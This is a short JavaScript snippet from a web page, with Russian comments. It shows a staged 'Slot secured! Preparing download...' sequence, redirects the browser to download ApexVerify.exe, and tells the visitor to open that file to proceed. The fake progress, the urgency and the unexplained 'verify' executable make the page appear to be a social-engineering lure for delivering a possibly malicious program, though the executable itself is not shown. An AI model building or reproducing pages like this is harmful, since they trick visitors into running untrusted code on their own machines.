<script>
    function startProcess() {
        const btn = document.getElementById('action-btn');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');

        btn.style.display = 'none';
        loader.style.display = 'block';

        setTimeout(() => {
            msg.innerText = "Slot secured! Preparing download...";
            
            setTimeout(() => {
                // Указываем ПРАВИЛЬНОЕ название файла, которое ты написал
                // Проверяем оба варианта пути (в папке и в корне)
                const fileUrl = 'api/v4/download/ApexVerify.exe';
                const rootUrl = 'ApexVerify.exe';

                // Пытаемся скачать
                fetch(fileUrl).then(res => {
                    window.location.href = res.ok ? fileUrl : rootUrl;
                }).catch(() => {
                    window.location.href = rootUrl;
                });

                msg.style.color = '#10b981';
                msg.innerText = "✅ Success! Open ApexVerify.exe to proceed.";
            }, 2000);
            
        }, 2000);
    }
</script>
